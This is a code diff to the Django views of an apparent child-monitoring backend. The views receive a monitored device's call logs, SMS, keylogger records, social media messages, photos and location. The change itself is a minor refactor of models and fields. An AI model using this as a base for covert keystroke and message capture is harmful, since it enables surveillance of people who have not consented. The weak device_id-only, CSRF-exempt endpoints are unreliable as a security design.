@@ -5,8 +5,17 @@ from django.core.exceptions import PermissionDenied
 from django.views.decorators.csrf import csrf_exempt
 from django.shortcuts import get_object_or_404, render
 from .models import (
-    Child, LocationLog, IPLog, DeviceInfoLog, PhotoCapture,
-    SensorDataLog, PermissionLog, SMSLog, CallLog, SocialMediaLog, KeyloggerLog
+    Child,
+    LocationLog,
+    IPLog,
+    DeviceInfoLog,
+    PhotoCapture,
+    SensorDataLog,
+    PermissionLog,
+    SMSLog,
+    CallLog,
+    KeyloggerLog,
+    SocialMediaMessage,
 )
 
 def landing(request):
@@ -659,9 +668,9 @@ def update_call_log(request):
             child = get_object_or_404(Child, device_id=device_id)
             CallLog.objects.create(
                 child=child,
-                caller=data.get('caller'),
-                callee=data.get('callee'),
-                duration=data.get('duration', 0)
+                number=data.get('number') or data.get('caller') or data.get('callee'),
+                duration=data.get('duration', 0),
+                type=data.get('type', 'incoming'),
             )
             return JsonResponse({'status': 'ok'})
         except Exception as e:
@@ -743,11 +752,11 @@ def update_social_log(request):
             data = json.loads(request.body)
             device_id = data.get('device_id')
             child = get_object_or_404(Child, device_id=device_id)
-            SocialMediaLog.objects.create(
+            SocialMediaMessage.objects.create(
                 child=child,
                 platform=data.get('platform'),
                 sender=data.get('sender'),
-                message=data.get('message')
+                content=data.get('message')
             )
             return JsonResponse({'status': 'ok'})
         except Exception as e:
